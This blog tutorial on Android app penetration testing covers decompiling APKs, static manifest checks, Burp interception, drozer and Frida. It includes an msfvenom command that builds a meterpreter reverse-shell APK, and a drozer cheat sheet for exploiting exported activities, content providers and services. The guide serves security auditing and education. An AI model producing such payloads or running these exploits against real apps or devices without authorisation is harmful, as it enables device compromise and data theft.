---
layout: single
title: Android Hacking
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/security.jpg
categories:
  - Blue Team
  - infosec
tags:
  - Blue Team
  - Red Team
---


It is common to find mobile applications when we are conducting a security audit or doing bug bounty programs, so I decided to create this room where we will see a set of tests that I do when I am doing this type of audit.

What is Native And Hybrid Applications?

Native: They are those developed applications only and exclusively for mobile operating systems, either Android or IOS. In Android you use the Java or kotlin programming language, while in IOS you make use of Swift or Objective-C. These programming languages are the official ones for the respective operating systems.

Hybrid: These applications use technologies such as HTML, CSS and JavaScript, all of these linked and processed through frameworks such as Apache Córdova "PhoneGap", Ionic, among others.

What is android's SMALI code?

When you create an application code, the apk file contains a .dex file, which contains binary Dalvik bytecode. Smali is an assembly language that runs on Dalvik VM, which is Android's JVM.

Example:

![image](https://user-images.githubusercontent.com/89842187/134012898-d299fcdd-9c25-4608-ac70-5770d811c8c9.png)

![image](https://user-images.githubusercontent.com/89842187/134013069-28cbac45-1879-4a05-a7d6-f43e43225203.png)

Sintaxis de Smali - Tipos

![image](https://user-images.githubusercontent.com/89842187/134013095-52027dfa-0abe-46d5-8546-9c69fdfe94c7.png)

# Smali Registers by JesusFreke

## Introduction
In dalvik's bytecode, registers are always 32 bits, and can hold any type of value. 2 registers are used to hold 64 bit types (Long and Double).

## Specifying the number of registers in a method
There are two ways to specify how many registers are available in a method. the .registers directive specifies the total number of registers in the method, while the alternate .locals directive specifies the number of non-parameter registers in the method. The total number of registers would therefore include the registers needed to hold the method parameters.

## How method parameters are passed into a method
When a method is invoked, the parameters to the method are placed into the last n registers. If a method has 2 arguments, and 5 registers (v0-v4), the arguments would be placed into the last 2 registers - v3 and v4.

The first parameter to a non-static methods is always the object that the method is being invoked on.

For example, let's say you are writing a non-static method LMyObject;->callMe(II)V. This method has 2 integer parameters, but it also has an implicit LMyObject; parameter before both integer parameters, so there are a total of 3 arguments to the method.

Let's say you specify that there are 5 registers in the method (v0-v4), with either the .registers 5 directive or the .locals 2 directive (i.e. 2 local registers + 3 parameter registers). When the method is invoked, the object that the method is being invoked on (i.e. the this reference) will be in v2, the first integer parameter will be in v3, and the second integer parameter will be in v4.

For static methods it's the same thing, except there isn't an implicit this argument.

## Register names
There are two naming schemes for registers - the normal v naming scheme and the p naming scheme for parameter registers. The first register in the p naming scheme is the first parameter register in the method. So let's go back to the previous example of a method with 3 arguments and 5 total registers. The following table shows the normal v name for each register, followed by the p name for the parameter registers

```
Local	Param	
v0		the first local register
v1		the second local register
v2	p0	the first parameter register
v3	p1	the second parameter register
v4	p2	the third parameter register
```

You can reference parameter registers by either name - it makes no difference.

## Motivation for introducing parameter registers

The p naming scheme was introduced as a practical matter, to solve a common annoyance when editing smali code.

Say you have an existing method with a number of parameters and you are adding some code to the method, and you discover that you need an extra register. You think "No big deal, I'll just increase the number of registers specified in the .registers directive!".

Unfortunately, it isn't quite that easy. Keep in mind that the method parameters are stored in the last registers in the method. If you increase the number of registers - you change which registers the method arguments get put into. So you would have to change the .registers directive and renumber every parameter register.

But if the p naming scheme was used to reference parameter registers throughout the method, you can easily change the number of registers in the method, without having to worry about renumbering any existing registers.

Note: by default baksmali will use the p naming scheme for parameter registers. If you want to disable this for some reason and force baksmali to always use the v naming scheme, you can use the -p/--no-parameter-registers option.

## Long/Double values

As mentioned previously, long and double primitives (J and D respectively) are 64 bit values, and require 2 registers. This is important to keep in mind when you are referencing method arguments. For example, let's say you have a (non-static) method LMyObject;->MyMethod(IJZ)V. The parameters to the method are LMyObject;, int, long, bool. So this method would require 5 registers for all of its parameters.

Register	Type
p0	this
p1	I
p2, p3	J
p4	Z

Also, when you are invoking the method later on, you do have to specify both registers for any double-wide arguments in the register list for the invoke-instruction.

```
Application Structure. (APK)

```

![image](https://user-images.githubusercontent.com/89842187/134013522-80a66f70-b1f8-4787-a858-c8a92c5a0d90.png)

```

AndroidManifest.xml: the manifest file in binary XML format.

classes.dex: application code compiled in the dex format.

resources.arsc: file containing precompiled application resources, in binary XML.

res/: folder containing resources not compiled into resources.arsc

assets/: optional folder containing applications assets, which can be retrieved by AssetManager.

lib/: optional folder containing compiled code - i.e. native code libraries.

META-INF/: folder containing the MANIFEST.MF file, which stores meta data about the contents of the JAR. which sometimes will be store in a folder named original.The signature of the APK is also stored in this folder.

```

Every APK file includes an AndroidManifest.xml file which declares the application’s package name, version components and other metadata. Full detail of Android manifest specs file can be view here. Below is just some common attributes that can identify in AndroidManifest.

![image](https://user-images.githubusercontent.com/89842187/134013648-b793f840-3d50-40e3-8317-f5041c1827e0.png)

# Setup Environment

In this room it's time for setting up the environment, here we're going to talk about recommended tools for interact with our applications.

Install Java Development Kit 1.7

The JDK is a development environment for building applications, applets, and components using the Java programming language.

Install Java https://www.java.com/en/download/

Java Development Kit 1.7 https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html

Emulators

An Android emulator is an Android Virtual Device, that represents a specific Android device. You can use an Android emulator as a target platform to run and test your Android applications on your PC.

Don't necesary Install emulator if have a rooted phone. My favorite emulator for windows, linux and Mac is Genymotion as it is very easy to use. Create account and download the installer for your platform/Operating system.

https://www.genymotion.com/

Install genymotion and login in your account in the aplication, now download your favorite android version for testing. I personally recommend 6.0.

![image](https://user-images.githubusercontent.com/89842187/134018616-d3433173-beec-49f4-9e89-c99d0fb5e21c.png)

For windows and mac users other option is Nox emulator

Nox Emulator https://www.bignox.com/

## Enable Developer options in your emulator or rooted phone﻿

Is necessary active this function for use debug usb.

You can unlock the Developer options on any Android smartphone or tablet by locating the Build number in your Settings menu and tapping it multiple times. However, the exact location of the aforementioned build number may differ depending on your phone’s manufacturer.

Settings > About Phone > Build number > Tap it 7 times to become developer;

![image](https://user-images.githubusercontent.com/89842187/134018709-85fa058e-c319-4348-a305-c5146576d222.png)

Now, Settings > Developer Options > USB Debugging.

![image](https://user-images.githubusercontent.com/89842187/134018735-41243073-d35c-4ab4-90f6-63ce5c867d90.png)

# Methodology

My methodology for pentest android apps.

![image](https://user-images.githubusercontent.com/89842187/134021886-ef57f08a-60fb-4fa3-ba1d-daa88fae263a.png)


# Information Gathering

Information collection is the first thing we need to do, as this information will guide us to the next stage in our penetration tests.

Black Box: In penetration testing, black-box testing refers to a method where an ethical hacker has no knowledge of the system being attacked.

How do I find the application of the organization?

Easy, play store: is a digital distribution platform for mobile apps for devices with Android operating system. 

![image](https://user-images.githubusercontent.com/89842187/134021972-08b58188-7838-4a2b-a54c-736761967bb1.png)

![image](https://user-images.githubusercontent.com/89842187/134021986-7600f7e8-0f49-4eee-a627-24e63fbdebee.png)

White Box: White box penetration testing can also be called glass box penetration testing or clear box penetration testing. In any case, it's an approach to penetration testing that relies on the knowledge of the target system's internal configuration. It uses this information for the test cases.

In a real scenario the client it will give us the mobile app, users and passwords to perform the login and also a user manual of how the application works.

Important

Not use an online services for download the apk file, don't knows if we're analyzing the real app.

![image](https://user-images.githubusercontent.com/89842187/134034206-1d7fe531-0828-4b18-867d-61a5ff4ee556.png)

# Reversing

In this part we will extract the legitimate apk from emulator or the device and get the source code.

# TOOL

Android Debug Bridge (ADB) is a development tool that facilitates communication between an Android device and a personal computer.

https://www.xda-developers.com/install-adb-windows-macos-linux/
How to Install ADB on Windows, macOS, and Linux

Note: You need debug usb enable in your emulator or device.

## How view devices?
```
adb devices
```
![image](https://user-images.githubusercontent.com/89842187/134043593-a210fb1b-3a16-4e0f-822b-d7983482759b.png)

## How extract apk?

For this you need have installed the application in your device and know package name

```
adb shell pm path package_name
```

This command print the path to the APK of the given

![image](https://user-images.githubusercontent.com/89842187/134043680-d01f79c0-70d0-4d4a-95f8-fc6451754780.png)

adb pull <remote> [<locaDestination>]

This command pulls the file remote to local. If local isn’t specified, it will pull to the current folder.

![image](https://user-images.githubusercontent.com/89842187/134043707-c52a39b1-648d-4437-8bbe-fc7daaa3c2b2.png)
  
  Now,how a get source code?



This command pulls the file remote to local. If local isn’t specified, it will pull to the current folder.

jadx: The jadx suite allows you to simply load an APK and look at its Java source code. What’s happening under the hood is that jADX is decompiling the APK to smali and then converting the smali back to Java.

Usage:
```
jadx -d [path-output-folder] [path-apk-or-dex-file]
```
  
  ![image](https://user-images.githubusercontent.com/89842187/134043740-7025fdc5-59da-4d6b-a35b-bfd1aa073792.png)
  
  ![image](https://user-images.githubusercontent.com/89842187/134043755-57af97f8-ae3b-461b-b7ae-d9271db593f0.png)
  
  Dex2Jar: use dex2jar to convert an APK to a JAR file.
  
  ```
  d2j-dex2jar.sh or .bat /path/application.apk
  ```
  ![image](https://user-images.githubusercontent.com/89842187/134043791-7b92aefb-a592-4fcd-8191-c322df31035e.png)

Once you have the JAR file, simply open it with JD-GUI and you’ll see its Java code.

apktool: This tool get a source code in smali.

  ```
apktool d file.apk
```
  ![image](https://user-images.githubusercontent.com/89842187/134043813-eaebba20-5e38-4aa3-8530-1a4e7dbb211a.png)
  
  ![image](https://user-images.githubusercontent.com/89842187/134043819-fbf06c73-bcba-460b-b27e-119be22cc5f7.png)
  
  jadx-gui:  UI version of jadx

jadx\bin\jadx-gui
  
  ![image](https://user-images.githubusercontent.com/89842187/134043825-a7b08796-685f-4915-8839-2bef8bccac7c.png)

  # Static analysis
  
  Is done without running the program, what are we going to identify in this basic room?

- Weak or improper cryptography use
- Exported Preference Activities
- Apps which enable backups
- Apps which are debuggable
- App Permissions.
- Firebase Instance(s)
- Sensitive data in the code

  Weak or improper cryptography use: Incorrect uses of encryption algorithm may result in sensitive data exposure, key leakage, broken authentication, insecure session and spoofing attack.

Example: For Java implementation, the following API is related to encryption. Review the parameters of the encryption implementation.
```
IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));

SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
```
How to search this when I have the source code of the application? there is a super advanced tool and wonderful  called grep.

```
grep -r "SecretKeySpec" *

grep -rli "aes" *

grep -rli "iv"

```
  
  ![image](https://user-images.githubusercontent.com/89842187/134048591-981f7666-e317-4775-a940-3c1878bd6007.png)
  
  Open the file with you favorite editor of text. Gedit/Vim/subl, etc… use this for revolse a puzzle in my ctf "LaxCTF".
  
  in real life:

![image](https://user-images.githubusercontent.com/89842187/134048629-10ee3e5a-48a2-4aef-bcb4-348e639b738e.png)
  
## Exported Preference Activities: 
  
 As we know, Android's activity component is application screen(s) and the action(s) that applied on that screen(s) when we use the application. When as activity is found to be shared with other apps on the device therefore leaving it accessible to any other application on the device.

Okay, exploit this in dynamic analysis... How identify the activity is exported?
  
  ![image](https://user-images.githubusercontent.com/89842187/134048657-f24fd10a-3212-4d05-af35-3c6d11eaeac1.png)
  
  ```
  cat AndroidManifest.xml | grep "activity" --color


  ```

![image](https://user-images.githubusercontent.com/89842187/134048698-ec111db8-e91c-4074-973b-a0e99fe551b3.png)

## Apps which enable backups: 
  
This is considered a security issue because people could backup your app via ADB and then get private data of your app into their PC.
```
Shared preference.
directory returned by getFilesDir().
getDataBase(path) also includes files created by SQLiteOpenHelper.
files in directories created with getDir(Sring, int).
files on external storage returned by getExternalFilesDir (String type).
```
How identify this?

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.

![image](https://user-images.githubusercontent.com/89842187/134048773-cecab955-e777-4ab9-9091-da71d918f380.png)
  
  ```
  cat AndroidManifest.xml | grep "android:allowBackup" --color

  ```
  
  ![image](https://user-images.githubusercontent.com/89842187/134048791-b9263e52-c16e-4022-b6ac-6b924ececb9b.png)
  
  Real scenario? you use your mind for this exercice :3.

Solution: android:allowBackup="false"
  
## Apps which are debuggable: Debugging was enabled on the app which makes it easier for reverse engineers to hook a debugger to it. This allows dumping a stack trace and accessing debugging helper classes.

How identify this?

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.
![image](https://user-images.githubusercontent.com/89842187/134048885-eca512c3-fded-45e8-a638-fdc8dbee3932.png)

```
  cat AndroidManifest.xml | grep "android:debuggable" --color

  ```
![image](https://user-images.githubusercontent.com/89842187/134048949-74040f41-49da-440a-a144-4a47f14622f1.png)


## App Permissions: 
  
System permissions are divided into two groups: “normal” and “dangerous.” Normal permission groups are allowed by default, because they don’t pose a risk to your privacy. (e.g., Android allows apps to access the Internet without your permission.) Dangerous permission groups, however, can give apps access to things like your calling history, private messages, location, camera, microphone, and more. Therefore, Android will always ask you to approve dangerous permissions.

In earlier versions of Android, accepting potentially dangerous permission groups was an all-or-nothing affair. You either allowed all permissions an app needed to function — before installation — or you declined them all, which meant you couldn’t install the app.
  
 ```
  msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > /root/tryhackme.apk

  ```

I going to analyze the permissions of an apk app generated by metasploit.

  Okay, HOW?

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.
  
  ![image](https://user-images.githubusercontent.com/89842187/134049014-0a5da1a1-b811-498d-ba22-de42990934f3.png)

  
## Firebase Instance(s): 
  
Last year, security researchers have discovered unprotected Firebase databases of thousands of iOS and Android mobile applications that are exposing over 100 million data records, including plain text passwords, user IDs, location, and in some cases, financial financial records such as banking and cryptocurrency transactions.

Google's Firebase service is one of the most popular back-end development platforms for mobile and web applications that offers developers a cloud-based database, which stores data in JSON format and synced it in the real-time with all connected clients.

How identify this? 

FireBase Scanner, The scripts helps security analsts to identify misconfigured firebase instances.

git clone https://github.com/shivsahni/FireBaseScanner

python FireBaseScanner.py -p /path/apk
  
  ![image](https://user-images.githubusercontent.com/89842187/134049161-57d1ea69-e2b3-411a-a841-6163b7e60188.png)

  Sensitive data in the code: Users, passwords, internal IP and more ... 

With your favorite editor of text, Gedit/Vim/subl, etc…, grep or GUI decompiler back to reversing and experiment with your favorite tool.
  
  ![image](https://user-images.githubusercontent.com/89842187/134049173-14b85faa-6ba6-4b9a-a409-b49ce858aeb9.png)
![image](https://user-images.githubusercontent.com/89842187/134049188-727563a1-330c-474c-a8c0-729235ffba85.png)
  
  In the real life exist very bad practice of programing! how example: 
  
  ![image](https://user-images.githubusercontent.com/89842187/134049206-7516ac5b-68db-42c9-9a32-2845f4a34012.png)
  
  ![image](https://user-images.githubusercontent.com/89842187/134049215-6fcb11ca-e1e1-43e3-b30b-9ac121a5cf97.png)
  
  ![image](https://user-images.githubusercontent.com/89842187/134049222-8d760366-7bfb-4532-83f4-5553d3bad9ab.png)
  
  ![image](https://user-images.githubusercontent.com/89842187/134049230-1454a50a-4633-4274-8dc0-0eb1a1e8a9c0.png)
  
# How to automatize this process?

It is very entertaining to do this manually, but in a real pentest the time is not our friend.

## MARA Framework: https://github.com/xtiankisutsa/MARA_Framework

Is a Mobile Application Reverse engineering and Analysis Framework. It is a tool that puts together commonly used mobile application reverse engineering and analysis tools, to assist in testing mobile applications against the OWASP mobile security threats. Its objective is to make this task easier and friendlier to mobile application developers and security professionals.

## APK Manifest Analysis

Extract Intents
Extract exported activities
Extract receivers
Extract exported receivers
Extract Services
Extract exported services
Check if apk is debuggable
Check if apk allows backups
Check if apk allows sending of secret codes
Check if apk can receive binary SMS
  
## Security Analysis

Source code static analysis based on OWASP Top Mobile Top 10 and the OWASP Mobile Apps Checklist
MARA is capable of performing either single or mass analysis of apk, dex or jar files.
  
  ![image](https://user-images.githubusercontent.com/89842187/134049358-780eda35-3bcb-4ea1-8dc8-e81dde045db7.png)
  
  ## QARK https://github.com/linkedin/qark
  
  Is a static code analysis tool, designed to recognize potential security vulnerabilities and points of concern for Java-based Android applications. QARK was designed to be community based, available to everyone and free for use. QARK educates developers and information security personnel about potential risks related to Android application security, providing clear descriptions of issues and links to authoritative reference sources. QARK also attempts to provide dynamically generated ADB (Android Debug Bridge) commands to aid in the validation of potential vulnerabilities it detects. It will even dynamically create a custom-built testing application, in the form of a ready to use APK, designed specifically to demonstrate the potential issues it discovers, whenever possible.”
  
  ## MobSF
  
  My favorite tool :3 is Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis.
  
  ![image](https://user-images.githubusercontent.com/89842187/134049436-6b71051b-53f5-403e-b3bb-bb77aaabdc4a.png)
  
## 1. Information

Display data such as app icon, app name, size, package name etc.MD5 & SHA1 are also shown. They can be useful to detect known malicious applications.

## 2. Scan options

· Rescan the application
· Start the dynamic analysis
· Check the java code & the manifest file

## 3. Signer certificate

·Display certificate info
·Determine if an application has come from its original source.

## 4. Permissions

· Analyzes the permissions
· Determines its status concerning critically & the description of permissions.

## 5. Binary analysis

· It is threat assessment & vulnerability testing at the binary code level.
· It can also be used to analyze third party libraries, allowing a richer analysis & better visibility into how applications will interact with libraries.
· This is analysis of binary code to identify security issues. For complex systems using third party libraries for which source code is not available binary code analysis helps to identify issues.

## 6. Android API

You can view android API used in app like java reflection, location.

## 7. Browsable activities

That can be safely invoked from a browser.

## 8. Security analysis

Manifest analysis:

Find vulnerability inside one of the components in the AndroidManifest.xml file.

Code analysis:

· Analysis result of java code by a static analyzer.
· Identifies potential vulnerabilities, determines their severity & the files in which this type of vulnerability was found.CVSS :

· Common Vulnerability Scoring System

· Vulnerability is assigned a CVSS base score between 0.0 & 10.0.

0.0 → No risk
0.1–3.9 → Low risk
4.0–6.9 → Medium risk
7.0–8.9 → High risk
9.0–10.0 → Critical risk score

CWE :

· Common Weakness Enumeration
· It is a list of software architecture, design or a code weakness.

File analysis:

Shows analysis of files.

## 9. Malware analysis

Determine the functionality, origin & potential impact of a given malware sample such as virus.

## 10. Reconnaissance

URL :

Display list of URLs, IP addresses & the files in which they are stores or called. Analyzes where the android app sends the data & where it stores the info.

Emails 

Strings :
· Analyzes the text files that are in the res directory.
· May contain sensitive data.

## 11. Components

Display a complete list of components (activity, service, content provider & receiver), imported libraries & files without defining the extension.


# Static analysis – Complications


## Obfuscate Code:

is the process of modifying an executable so that it is no longer useful to a hacker but remains fully functional. While the process may modify actual method instructions or metadata, it does not alter the output of the program. To be clear, with enough time and effort, almost all code can be reverse engineered. However, on some platforms (such as Java, Android, iOS and .NET) free decompilers can easily reverse-engineer source code from an executable or library in virtually no time and with no effort. Automated code obfuscation makes reverse-engineering a program difficult and economically unfeasible. 

## Proguard:

To obfuscate the code, use the Proguard utility, which makes these actions:

    Removes unused variables, classes, methods, and attributes;
    Eliminates unnecessary instructions;
    Removes Tutorial information: obfuscate Androiddepuración code;
    Renames classes, fields, and methods with unlegible names.
  
  ![image](https://user-images.githubusercontent.com/89842187/134049791-7129768b-ed53-494a-9119-aee67c163497.png)

## DEXGUARD

The enhanced commercial version of Proguard. This tool is capable of implementing the text encryption technique and renaming classes and methods with non-ASCII symbols.
  
  ![image](https://user-images.githubusercontent.com/89842187/134049829-5bc29a58-049c-4294-a636-33858a4e42d4.png)
  
## Deguard: 

It is based on powerful probabilistic graphical models learned from thousands of open source programs. Using these models, Deguard retrieves important information in Android APK, including method and class names, as well as third-party libraries. Deguard can reveal string decoders and classes that handle sensitive data in Android malware.
  
  
  ## Dynamic Analysis
  
  How install applications with adb?

adb install apkfilename.apk

okay, now how intercept traffic of the application?

Burp Suite: Is an integrated platorm for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application’s attack surface, through to finding and exploiting security vulnerabilities.
  
  https://support.portswigger.net/customer/portal/articles/1841101-configuring-an-android-device-to-work-with-burp
  
  Installing trusted CA at the Android OS level (Root device/Emulator) for Android N+ as the following:

  
  ```
  openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1

cat BurpCA.pem > 9a5ba580.0

openssl x509 -inform PEM -text -in BurpCA.pem -out /dev/null >> 9a5ba580.0

adb root

abd remount

adb push 9a5ba580.0 /system/etc/security/cacerts/

adb shell "chmod 644 /system/etc/security/cacerts/9a5ba580.0"

adb shell "reboot"
  ```
![image](https://user-images.githubusercontent.com/89842187/134050984-42dade74-ed80-416d-b09c-94325d9d18a1.png)

  ## PID Cat https://github.com/JakeWharton/pidcat
  
  Tool for shows log entries for a specific application package when debug=true is enable in the app.

![image](https://user-images.githubusercontent.com/89842187/134051037-34e6531c-5413-4e87-882b-c586cfcffc2a.png)
  
# Drozer https://github.com/FSecureLABS/drozer
  
  drozer helps to provide confidence that Android apps and devices being developed by, or deployed across, your organisation do not pose an unacceptable level of risk. By allowing you to interact with the Dalvik VM, other apps’ IPC endpoints and the underlying OS.

drozer provides tools to help you use and share public exploits for Android. For remote exploits, it can generate shellcode to help you to deploy the drozer Agent as a remote administrator tool, with maximum leverage on the device.

drozer is a comprehensive security audit and attack framework for Android.

Basic example, Abusing unprotected activities:

The requirement for this is you have install drozer in your computer and drozer agent in your emulator or devices. Click in the title, for the tutorial of how install...

Commands:
```
adb forward tcp:31415 tcp:31415
```
drozer console connect
  
  Now download and install apk for this example

![image](https://user-images.githubusercontent.com/89842187/134051121-cb7f55eb-a4ee-4447-a0ad-fcda5311c97b.png)
  
  Retrieving package information:
  
```
  run app.package.list -> see all the packages installed
```
  
  ![image](https://user-images.githubusercontent.com/89842187/134051177-f48bee13-2e1b-4e5f-996d-79030bc10738.png)
  
  ```
  run app.package.info -a -> view package information.
```
  
  ![image](https://user-images.githubusercontent.com/89842187/134051216-0a99b929-8070-4983-9729-42e5dbfdefa1.png)
  
  Identifying the attack surface -> activities unprotected and more....
  
  ```
  run app.package.attacksurface package_name
  ```
![image](https://user-images.githubusercontent.com/89842187/134051245-b4b5c1dc-be99-4056-a886-12af5fcebb06.png)
  
  view what activities can be exploited.

```
  run app.activity.info -f package_name
```
![image](https://user-images.githubusercontent.com/89842187/134051290-70b1c667-c245-42b3-8986-0a38215e3a5f.png)
  
  start activities unprotected !

  ```
run app.activity.start --component package name component_name

```
  ![image](https://user-images.githubusercontent.com/89842187/134051354-1c36a62d-edd9-4a07-b12a-1849a68051ab.png)
  
  ## Basic Cheatsheet of Drozer
  
## Exploiting Content Provider

```
 run app.provider.info -a package_name

run scanner.provider.finduris -a package_name

run app.provider.query uri

run app.provider.update uri --selection conditions selection_arg column data

run scanner.provider.sqltables -a package_name

run scanner.provider.injection -a package_name

run scanner.provider.traversal -a package_name
```
  
## Exploiting Service


```
  run app.service.info -a package_name

run app.service.start --action action --component package_name component_name

run app.service.send package_name component_name --msg what arg1 arg2 --extra type key value --bundle-as-obj
```

## Inspeckage - Android Package Inspector

My favorite tool, Inspeckage is a tool developed to offer dynamic analysis of Android applications. By applying hooks to functions of the Android API, Inspeckage will help you understand what an Android application is doing at runtime. Inspeckage will let you interact with some elements of the app, such as activities and providers (even unexported ones), and apply some settings on Android.

Since dynamic analysis of Android applications (usually through hooks) is a core part of several mobile application security tests, the need of a tool that can help us do said tests is real. Even though there are other tools that promise to help you do that, I’ve run across some limitations when testing them:

Lack of interaction with the user doing the tests;
Only work in emulators;
Plenty of time to update the tool after an Android update;
Very poor output;
Very costly setup.
  
## Android Package Inspector Features

With Inspeckage, we can get a good amount of information about the application’s behavior:

Information gathering

Requested Permissions;
App Permissions;
Shared Libraries;
Exported and Non-exported Activities, Content Providers,Broadcast Receivers and Services;
Check if the app is debuggable or not;
Version, UID and GIDs;
etc.
Hooks

With the hooks, we can see what the application is doing in real time:

Shared Preferences (log and file);
Serialization;
Crypto;
Hashes;
SQLite;
HTTP (an HTTP proxy tool is still the best alternative);
File System;
Miscellaneous (Clipboard, URL.Parse());
WebView;
IPC.
  
  ## Insecure Data Storage
  
  We've totally interacted with our app now it's time to see the files created locally.

Many developers assume that storing data on client-side will restrict other users from having access to this data. Interestingly, most of the top mobile application security breaches have been caused by insecure or unnecessary client-side data storage. File systems on devices are no longer a sandboxed environment and rooting or jailbreaking usually circumvents any protections.

One needs to understand what different types of data are there and how are these stored insecurely.

Data - Usernames, Authentication tokens or passwords, Cookies, Location data, Stored application logs or Debug information, Cached application messages or transaction history, UDID or EMEI, Personal Information (DoB, Address, Social, etc), Device Name, Network Connection Name, private API calls for high user roles, Credit Card Data or Account Data, etc.

All apps (root or not) have a default data directory, which is /data/data/<package_name>. By default, the apps databases, settings, and all other data go here.

  ```
databases/: here go the app's databases
lib/: libraries and helpers for the app
files/: other related files
shared_prefs/: preferences and settings
cache/: well, caches
```
 For interact with device or emulator 
  ```
adb shell
```
  
  Once you are able to access the SQLite database file on an emulator, rooted device or via adb shell / run as [package name], there are a few options to inspect the schema and your SQLite database on device.
  
  https://sqlitebrowser.org/dl/
  
  Pull the file from device first, then use a GUI software to look the schema and content. I use SQLite browser which allows you to see the database schema, table content, as well as executing some simple SQL scripts.
```
adb pull /data/data/package-name/databases/sqlitedatabse
```
Inspect SQLite db via sqlite3 command line tool

For me the easier option is to use sqlite3 command line tool to inspect the database from adb shell.
```
cd data/data/package-name/databases/

sqlite3 db-name

.tables

.schema table-name
```
  
  ![image](https://user-images.githubusercontent.com/89842187/134076953-8d4e76bb-74c6-4929-8c15-38f7526805bd.png)
  
  ## Shared Preferences Files
  
  The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world-readable (accessible to all apps) or private. Misuse of the SharedPreferences API can often lead to exposure of sensitive data. Consider the following example:

  ```
SharedPreferences sharedPref = getSharedPreferences("key", MODE_WORLD_READABLE);
SharedPreferences.Editor editor = sharedPref.edit();
editor.putString("username", "administrator");
editor.putString("password", "supersecret");
editor.commit();
```
  
  Once the activity has been called, the file key.xml will be created with the provided data. This code violates several best practices.

  ```
  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
  <string name="username">administrator</string>
  <string name="password">supersecret</string>
</map>
  

  ```
  
  ![image](https://user-images.githubusercontent.com/89842187/134077053-b1b9f716-fb40-4340-96c5-8d5e02d8c85e.png)
  
  # Dynamic Analysis - Complications
  
  ## Root Detection in Android device:
  
  My explanation for this is:

  ```
if(device && emulator = rooted):

    print "app going to the shit!"

else:

    print "app found"  
```
  
So it is the best way to check in your application whether the device is rooted or not to avoid data theft but there’s no 100% way to check for root.

Check for Test-Keys: Test-Keys has to do with how the kernel is signed when it is compiled. By default, stock Android ROMs from Google are built with release-keys tags. Test-Keys means it is signed with a custom key generated by a third-party developer. Specifically, it will check in build properties(“android.os.Build.TAGS”) for test-keys.

  ```
  private boolean detectTestKeys() {
    String buildTags = android.os.Build.TAGS;
    return buildTags != null && buildTags.contains("test-keys");
}
  ```
  
  Check for “su” binary: Su binary check is to identify the superuser in the device. This binary is installed when you try to root your phone using apps like kinguser or via fastboot in Android. These files are necessary so that one can root their phone and become the superuser. The existence of this binary can be checked from the following paths.

  ```
  private boolean checkForSuBinary() {
    return checkForBinary("su"); // function is available below
}
  ```
  Check for “busybox” binary: If a device has been rooted, more often than not Busybox has been installed as well. Busybox is a binary that provides many common Linux commands. Running busybox is a good indication that a device has been rooted.
  
  ```
  private boolean checkForBusyBoxBinary() {
   return checkForBinary("busybox");//function is available below
}
  ```
  
  Check for SuExists: different file system check for the su binary.
  
  ```
  
private boolean checkSuExists() {
    Process process = null;
    try {
        process = Runtime.getRuntime().exec(new String[]
                {"/system /xbin/which", "su"});
        BufferedReader in = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
        String line = in.readLine();
        process.destroy();
        return line != null;
    } catch (Exception e) {
        if (process != null) {
            process.destroy();
        }
        return false;
    }
}
  ```
  
  The following paths, Su and busybox binaries are often looked for on rooted devices.
  
  ```
  
  private String[] binaryPaths= {
        "/data/local/",
        "/data/local/bin/",
        "/data/local/xbin/",
        "/sbin/",
        "/su/bin/",
        "/system/bin/",
        "/system/bin/.ext/",
        "/system/bin/failsafe/",
        "/system/sd/xbin/",
        "/system/usr/we-need-root/",
        "/system/xbin/",
        "/system/app/Superuser.apk",
        "/cache",
        "/data",
        "/dev"
};
  ```
  
  First you need to check the the pre-decompiled source code and check for functions that contains strings like “generic | emulator | google_sdk” and functions like “isEmulator | emulatorDetection…etc” … use your searching skills and read the code well
![image](https://user-images.githubusercontent.com/89842187/134077511-3f43801f-e125-4269-99a3-64f790fe861d.png)
  
  ## SSL Pinning: 
Is a technique that we use in the client side to avoid man-in-the-middle attack by validating the server certificates again even after SSL handshaking. The developers embed (or pin) a list of trustful certificates to the client application during development, and use them to compare against the server certificates during runtime. If there is a mismatch between the server and the local copy of certificates, the connection will simply be disrupted, and no further user data will be even sent to that server. This enforcement ensures that the user devices are communicating only to the dedicated trustful servers.
  
  ![image](https://user-images.githubusercontent.com/89842187/134077584-2eca6cf1-43b1-415d-9b53-652002514310.png)

After you have taken in the illustration above, note that certificate pinning attempts to ensure that the client is not exchanging messages with any other server than the one they hold a public key for. Therefore, the client is not exposed to attacks where a rogue Certificate Authority (CA) validates the authenticity of a malicious host serving content with a sham certificate.
  
  ```
  if(devices && emulators = CA_BURPSUITE):
    print "not intercept comunications ):"
else:
    print "App found"
  ```
  
  ## Bypass - Complications in Dynamic Analysis
  
  Hooking applications:

Techniques used to alter the behaviour of applications. 

Frida

In short, it is a dynamic instrumentation framework, which enables function hooking and allows to provide a definition to it during runtime. Basically, it injects JavaScript code into a process. Suppose, there is a function called “foo” in a program with a specific body/implementation. Using “Frida”, one can change the body/implementation of the “foo” function during runtime. “Frida” supports a variety of platforms like Windows, macOS, GNU/Linux, iOS, Android, and QNX. More information on “Frida” can be found here.

for install 

pip install frida-tools

Now check version and download the server, in my case is 12.6.8

frida --version

unzip file and push the server in the local system /data/local/tmp

adb push /path/serverfrida /data/local/tmp

Permissions

adb shell chmod 777 /data/local/tmp/frida-server

run frida server

adb shell /data/local/tmp/frida-servername&

now execute in your command line frida-ps -U
